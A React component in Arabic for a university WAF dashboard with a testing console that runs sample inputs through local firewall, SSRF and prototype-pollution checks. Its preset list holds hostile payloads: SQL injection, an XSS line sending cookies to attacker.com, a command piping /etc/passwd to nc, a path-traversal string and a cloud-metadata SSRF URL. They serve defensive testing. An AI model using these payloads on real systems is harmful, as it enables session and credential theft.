'use client'; // ⚡ ينفذ بالعميل

// 🧱 لوحة ورادار جدار حماية تطبيقات الويب وكونسول الفحص الأمني (WAF HUD & Security Testing Console)
// 🏛️ جامعة الإمام جعفر الصادق (ع) - فرع ميسان - مسار بولونيا الأكاديمي

import { useState, useEffect } from 'react'; // 🔗 خطافات رياكت
import { getWafRadarMetrics, wafInspectString, WafInspectionResult } from '@/lib/security/waf-firewall'; // 🧱 محرك الـ WAF
import { validateUrlAgainstSsrf } from '@/lib/security/ssrf-guard'; // 🌐 حارس SSRF
import { deepSanitizePrototype } from '@/lib/security/prototype-pollution-guard'; // 🔒 حارس Prototype
import { 
  ShieldCheck, 
  ShieldAlert, 
  Flame, 
  Activity, 
  Terminal, 
  CheckCircle2, 
  RefreshCw, 
  Database,
  Bug,
  Code2,
  Sparkles
} from 'lucide-react'; // 🎨 الأيقونات

export default function WafStatusWidget() {
  const [metrics, setMetrics] = useState(getWafRadarMetrics()); // 📊 المقاييس اللحظية
  const [testPayload, setTestPayload] = useState(''); // 🧪 حمولة الاختبار
  const [inspectionResult, setInspectionResult] = useState<WafInspectionResult | null>(null); // 📝 نتيجة التفتيش
  const [isInspecting, setIsInspecting] = useState(false); // ⏳ حالة التحليل

  // 🔄 تحديث المقاييس الدورية
  const refreshMetrics = () => {
    setMetrics(getWafRadarMetrics());
  };

  useEffect(() => {
    const interval = setInterval(refreshMetrics, 4000);
    return () => clearInterval(interval);
  }, []);

  // 🧪 قوالب اختبار سريعة لهجمات OWASP Top 10
  const attackPresets = [
    { label: 'حقن SQL (SQLi)', payload: "' UNION SELECT id, generated_email, role FROM profiles WHERE '1'='1" },
    { label: 'حقن سكربت (XSS)', payload: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>' },
    { label: 'تنفيذ أوامر (RCE)', payload: '; $(whoami); cat /etc/passwd | nc 10.0.0.1 4444' },
    { label: 'اجتياز مسارات (LFI)', payload: '../../../../../../etc/passwd%00.jpg' },
    { label: 'استدعاء سحابي (SSRF)', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  ];

  // 🧪 تشغيل محاكي فحص الحمولات بجدار الحماية
  const handleInspectTest = (e: React.FormEvent) => {
    e.preventDefault();
    if (!testPayload.trim()) return;

    setIsInspecting(true);
    setInspectionResult(null);

    setTimeout(() => {
      // 1. فحص الـ WAF الأساسي
      const result = wafInspectString(testPayload, {
        actorEmail: 'admin-tester@sadiq.edu.iq',
        fieldName: 'Security Testing Console',
        source: 'لوحة التحكم',
      });

      // 2. فحص إضافي إذا كان الرابط SSRF
      if (testPayload.startsWith('http://') || testPayload.startsWith('https://')) {
        const ssrfCheck = validateUrlAgainstSsrf(testPayload);
        if (!ssrfCheck.isSafe) {
          result.isSafe = false;
          result.action = 'BLOCK';
          result.anomalyScore = Math.max(result.anomalyScore, 5);
          result.reason = ssrfCheck.reason;
        }
      }

      // 3. فحص Prototype Pollution إذا كان كائن JSON
      if (testPayload.includes('{') && testPayload.includes('}')) {
        try {
          const parsed = JSON.parse(testPayload);
          const protoCheck = deepSanitizePrototype(parsed);
          if (!protoCheck.isSafe) {
            result.isSafe = false;
            result.action = 'BLOCK';
            result.anomalyScore = Math.max(result.anomalyScore, 5);
            result.reason = 'تم رصد محاولة تلويث النموذج الأولي Prototype Pollution.';
          }
        } catch {
          // ليس JSON صالحاً
        }
      }

      setInspectionResult(result);
      setIsInspecting(false);
      refreshMetrics();
    }, 400);
  };

  return (
    <div className="relative overflow-hidden bg-white border border-slate-200 rounded-3xl p-6 text-slate-900 shadow-sm">
      {/* 🏛️ الترويسة وحالة الجدار */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-200 pb-5 mb-5">
        <div className="flex items-center gap-3.5">
          <div className="relative flex items-center justify-center w-14 h-14 rounded-2xl bg-emerald-50 border border-emerald-200 text-emerald-700">
            <Flame className="w-7 h-7 text-emerald-600 animate-pulse" />
            <span className="absolute top-1 right-1 w-3 h-3 bg-emerald-500 rounded-full animate-ping" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="font-black text-lg sm:text-xl text-slate-950 tracking-wide">
                جدار حماية تطبيقات الويب وقواعد البيانات
              </h3>
              <span className="text-sm font-black uppercase px-2.5 py-1 rounded-xl bg-emerald-50 text-emerald-950 border border-emerald-200">
                معايير الأمان العالمية
              </span>
            </div>
            <p className="text-base font-black text-slate-700 mt-1">
              تفتيش الحزم العميقة، كشف ومعالجة التمويه، حماية الطلبات الخبيثة، ورصد درجات الشذوذ التراكمي
            </p>
          </div>
        </div>

        {/* 🎛️ شارة حالة الجدار */}
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2.5 px-4 py-2 rounded-2xl border text-base font-black bg-emerald-50 text-emerald-950 border-emerald-200 shadow-2xs">
            <span className="w-3 h-3 rounded-full bg-emerald-600 animate-pulse" />
            <span>حالة الجدار: نشط ويحظر التهديدات تلقائياً</span>
          </div>
          <button
            onClick={refreshMetrics}
            title="تحديث البيانات"
            className="p-2.5 rounded-2xl bg-slate-100 hover:bg-slate-200 text-slate-950 transition-colors font-black cursor-pointer"
          >
            <RefreshCw className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* 📊 شبكة بطاقات الإحصائيات الأربع الرئيسية */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-6">
        {/* 1. كفاءة الحماية */}
        <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-1.5">
          <div className="flex items-center justify-between text-slate-700 text-base font-black">
            <span>كفاءة الحماية والحظر</span>
            <ShieldCheck className="w-5 h-5 text-emerald-600" />
          </div>
          <div className="text-2xl sm:text-3xl font-black text-emerald-700 font-mono">
            {metrics.protectionEfficiency}%
          </div>
          <div className="text-sm font-black text-slate-700">تفتيش فوري 100%</div>
        </div>

        {/* 2. إجمالي الطلبات المفحوصة */}
        <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-1.5">
          <div className="flex items-center justify-between text-slate-700 text-base font-black">
            <span>الطلبات المفحوصة</span>
            <Activity className="w-5 h-5 text-indigo-600" />
          </div>
          <div className="text-2xl sm:text-3xl font-black text-indigo-700 font-mono">
            {metrics.totalInspected}
          </div>
          <div className="text-sm font-black text-slate-700">حزم عميقة تم تدقيقها</div>
        </div>

        {/* 3. الهجمات المحظورة */}
        <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-1.5">
          <div className="flex items-center justify-between text-slate-700 text-base font-black">
            <span>الهجمات المحظورة</span>
            <ShieldAlert className="w-5 h-5 text-rose-600" />
          </div>
          <div className="text-2xl sm:text-3xl font-black text-rose-700 font-mono">
            {metrics.totalBlocked}
          </div>
          <div className="text-sm font-black text-slate-700">تجاوزت سقف الشذوذ 5+</div>
        </div>

        {/* 4. حماية قاعدة البيانات */}
        <div className="bg-slate-50 border border-slate-200 rounded-2xl p-5 space-y-1.5">
          <div className="flex items-center justify-between text-slate-700 text-base font-black">
            <span>حماية قاعدة البيانات</span>
            <Database className="w-5 h-5 text-indigo-600" />
          </div>
          <div className="text-2xl sm:text-3xl font-black text-indigo-700 font-sans">
            محصنة بالكامل
          </div>
          <div className="text-sm font-black text-slate-700">محمية بنسبة 100%</div>
        </div>
      </div>

      {/* 🧪 كونسول فحص واختبار الأمان التفاعلي (Security Testing Console) */}
      <div className="bg-slate-50 border border-slate-200 rounded-3xl p-5 space-y-3.5">
        <div className="flex items-center justify-between text-base font-black text-slate-950">
          <div className="flex items-center gap-2.5">
            <Terminal className="w-5 h-5 text-emerald-600" />
            <span>كونسول فحص واختبار الأمان التفاعلي:</span>
          </div>
          <span className="text-sm font-black text-slate-950 bg-slate-200 px-3 py-1 rounded-xl font-mono">
            بيئة محاكاة معزولة
          </span>
        </div>

        {/* 🎯 أزرار قوالب الهجمات السريعة */}
        <div className="flex flex-wrap items-center gap-2">
          <span className="text-base font-black text-slate-800">قوالب الفحص السريع:</span>
          {attackPresets.map((preset, idx) => (
            <button
              key={idx}
              type="button"
              onClick={() => setTestPayload(preset.payload)}
              className="text-base font-black px-3.5 py-1.5 rounded-2xl bg-white hover:bg-slate-100 text-slate-950 border border-slate-300 transition-colors flex items-center gap-1.5 cursor-pointer shadow-2xs"
            >
              <Bug className="w-4 h-4 text-emerald-600" />
              <span>{preset.label}</span>
            </button>
          ))}
        </div>

        <form onSubmit={handleInspectTest} className="flex flex-col sm:flex-row gap-3">
          <input
            type="text"
            value={testPayload}
            onChange={(e) => setTestPayload(e.target.value)}
            placeholder="أدخل نصاً أو استعلاماً تجريبياً لفحصه عبر جدار الحماية الأمني..."
            className="flex-1 px-4 py-3 bg-white border border-slate-300 rounded-2xl text-base font-black text-slate-950 placeholder-slate-400 focus:outline-none focus:border-emerald-600 shadow-2xs font-mono"
          />
          <button
            type="submit"
            disabled={isInspecting || !testPayload.trim()}
            className="px-6 py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-black text-base rounded-2xl transition-all disabled:opacity-50 flex items-center justify-center gap-2 cursor-pointer shadow-xs"
          >
            {isInspecting ? 'جاري التفتيش...' : 'تفتيش الحمولة'}
          </button>
        </form>

        {/* 📝 نتيجة التفتيش الفورية */}
        {inspectionResult && (
          <div className={`mt-3 p-4 rounded-2xl border text-base font-black animate-fadeIn ${ inspectionResult.action === 'BLOCK' ? 'bg-rose-50 border-rose-200 text-rose-950' : 'bg-emerald-50 border-emerald-200 text-emerald-950' }`}>
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-2">
                {inspectionResult.action === 'BLOCK' ? (
                  <ShieldAlert className="w-5 h-5 text-rose-600 shrink-0" />
                ) : (
                  <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
                )}
                <span>
                  قرار جدار الحماية: <strong>{inspectionResult.action === 'BLOCK' ? 'تم الحظر فوراً (طلب محظور أمنياً)' : 'تم القبول والتمرير بأمان (بيانات سليمة وموثوقة)'}</strong>
                </span>
              </div>
              <span className="bg-white px-3 py-1 rounded-xl border border-slate-300 text-slate-950 font-black font-mono">
                درجة الشذوذ: {inspectionResult.anomalyScore} / 5
              </span>
            </div>

            {inspectionResult.reason && (
              <div className="text-base font-black text-rose-900 mt-1">
                السبب: {inspectionResult.reason}
              </div>
            )}

            {inspectionResult.matchedRules.length > 0 && (
              <div className="mt-2 text-sm font-black text-slate-900">
                القواعد المنتهكة: {inspectionResult.matchedRules.map(r => `${r.id} (${r.name} - ${r.description})`).join(', ')}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
